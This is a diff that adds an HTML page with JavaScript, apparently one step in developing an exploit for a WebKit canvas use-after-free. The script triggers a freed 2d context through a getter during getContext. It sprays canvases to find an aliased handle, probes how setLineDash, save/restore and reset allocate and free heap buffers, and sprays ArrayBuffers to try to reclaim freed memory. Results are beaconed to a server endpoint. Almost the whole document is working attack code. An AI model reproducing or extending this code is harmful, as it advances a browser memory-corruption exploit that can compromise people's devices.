@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P707 — lineDash Vector: allocation/free measurement</title>
+<script>
+'use strict';
+/* ============================================================
+ * P707 — MEASURE the lineDash Vector<double> behaviour
+ *
+ * Context: P701 guessed sizeof(State) and sprayed ArrayBuffer(6656)
+ * blind. That was a design error. This probe measures instead.
+ *
+ * Source facts (WK-7617 CanvasRenderingContext2DBase.h/.cpp) to test:
+ *
+ *   struct State { ... Vector<double> lineDash; ... };
+ *   Vector<State, 1> m_stateStack;          // value vector, inline cap 1
+ *   void save() { ++m_unrealizedSaveCount; } // DEFERRED, no alloc
+ *
+ *   setLineDash(dash):
+ *       realizeSaves();
+ *       state.lineDash = dash;                    (or appendVector)
+ *       applyLineDash();
+ *
+ *   restore():
+ *       m_stateStack.removeLast();   // destroys State => frees its buffer
+ *
+ * So: dash buffers live on the general fastMalloc heap (not IsoHeap),
+ * which is the ONLY heap ArrayBuffer shares. The question is which
+ * operation frees such a buffer while a live State still points at it.
+ *
+ * Sections are independent; each beacons its header BEFORE its risky
+ * step, so a crash still leaves earlier results.
+ * ============================================================ */
+
+function raw(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P707-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,320))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+function len(a){ return a ? a.length : -1 }
+function v0(a){ return (a && a.length) ? a[0] : 'none' }
+function vN(a){ return (a && a.length) ? a[a.length-1] : 'none' }
+
+var INNER=null, SPRAY=[], ALIAS=null, IDX=-1;
+
+function run(){ raw('BOOT','p707'); try{ s0(); }catch(e){ raw('ERR',(e.message||'').slice(0,140)); } }
+
+/* ---- S0/S1: proven same-type alias ---- */
+function s0(){
+  raw('S0-GO','');
+  var cv=document.createElement('canvas'); cv.width=1; cv.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ INNER=cv.getContext('2d'); return true; }});
+  cv.getContext('bitmaprenderer', o);
+  if(!INNER){ raw('S0-FAIL','no-inner'); return; }
+  raw('S0-UAF','ok');
+
+  for(var i=0;i<200;i++){
+    var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){ sx.lineWidth=1337.0; SPRAY.push(sx); }
+  }
+  try{ INNER.lineWidth=2468.0; }catch(e){ raw('S0-W-ERR',''); return; }
+  for(var k=0;k<SPRAY.length;k++){
+    try{ if(SPRAY[k].lineWidth===2468.0){ IDX=k; break; } }catch(e){}
+  }
+  raw('S1-ALIAS','idx='+IDX);
+  if(IDX<0){ raw('S1-FAIL','no-alias'); return; }
+  ALIAS=SPRAY[IDX];
+  setTimeout(s2, 20);
+}
+
+/* ---- S2: append or replace? ---- */
+function s2(){
+  raw('S2-GO','');
+  try{
+    INNER.setLineDash([]);
+    raw('S2-CLEAR','len='+len(INNER.getLineDash()));
+
+    INNER.setLineDash([1.5,2.5]);
+    var a1=INNER.getLineDash();
+    raw('S2-SET2','len='+len(a1)+'|v='+a1.join(','));
+
+    INNER.setLineDash([3.5,4.5,5.5]);
+    var a2=INNER.getLineDash();
+    raw('S2-SET3','len='+len(a2)+'|v='+a2.join(','));
+
+    raw('S2-VERDICT', (len(a2)>3) ? 'APPENDS' : 'REPLACES');
+  }catch(e){ raw('S2-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s3, 20);
+}
+
+/* ---- S3: growth => capacity reallocs (frees old buffers) ---- */
+function s3(){
+  raw('S3-GO','');
+  try{
+    INNER.setLineDash([]);
+    var res=[];
+    var sizes=[1,2,4,8,16,32,64,128,256,512,1024,2000];
+    for(var i=0;i<sizes.length;i++){
+      var arr=[];
+      for(var j=0;j<sizes[i];j++) arr.push(1000*sizes[i]+j);
+      INNER.setLineDash(arr);
+      res.push(sizes[i]+'->'+len(INNER.getLineDash()));
+    }
+    raw('S3-GROW',res.join(' '));
+  }catch(e){ raw('S3-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s4, 20);
+}
+
+/* ---- S4: save()/restore() free path ---- */
+function s4(){
+  raw('S4-GO','');
+  try{
+    INNER.setLineDash([]);
+    INNER.setLineDash([7.5,8.5,9.5]);
+    raw('S4-BEFORE','len='+len(INNER.getLineDash())+'|v='+INNER.getLineDash().join(','));
+
+    INNER.save();
+    INNER.setLineDash([10.5,11.5,12.5,13.5,14.5]);
+    raw('S4-INSAVE','len='+len(INNER.getLineDash())+'|v='+INNER.getLineDash().join(','));
+
+    INNER.restore();
+    var af=INNER.getLineDash();
+    raw('S4-AFTER','len='+len(af)+'|v='+af.join(','));
+
+    /* reset() nukes the whole stack */
+    INNER.reset();
+    raw('S4-RESET','len='+len(INNER.getLineDash()));
+  }catch(e){ raw('S4-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s5, 20);
+}
+
+/* ---- S5: cross-handle view after a big realloc ---- */
+function s5(){
+  raw('S5-GO','');
+  try{
+    INNER.setLineDash([]);
+    ALIAS.setLineDash([]);
+    var ND=512, big=[];
+    for(var i=0;i<ND;i++) big.push(50000+i);
+    ALIAS.setLineDash(big);
+    var g=INNER.getLineDash();
+    raw('S5-SET','set='+ND+'|innerLen='+len(g)+'|first='+v0(g)+'|last='+vN(g)+
+        '|bytes='+(ND*8));
+  }catch(e){ raw('S5-ERR',(e.message||'').slice(0,120)); }
+  setTimeout(s6, 20);
+}
+
+/* ---- S6: reclaim attempt with MEASURED sizing ---- */
+function s6(){
+  raw('S6-GO','');
+  try{
+    INNER.setLineDash([]);
+    var mid=[];
+    for(var i=0;i<64;i++) mid.push(70000+i);
+    ALIAS.setLineDash(mid);
+    raw('S6-SET','len64|bytes=512');
+
+    var ab=[];
+    for(var s=0;s<400;s++) ab.push(new ArrayBuffer(512));
+    raw('S6-SPRAY','n=400|sz=512');
+
+    var chk=INNER.getLineDash();
+    raw('S6-READ','len='+len(chk)+'|v0='+v0(chk)+'|vN='+vN(chk));
+
+    var nz=0;
+    for(var k=0;k<ab.length;k++){
+      var u=new Uint8Array(ab[k]);
+      for(var j=0;j<u.length;j++){ if(u[j]!==0){ nz++; break; } }
+    }
+    raw('S6-ABNZ','nonzero_buffers='+nz+'/'+ab.length);
+  }catch(e){ raw('S6-ERR',(e.message||'').slice(0,120)); }
+
+  raw('DONE','p707-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P707 — lineDash measurement</pre></body></html>
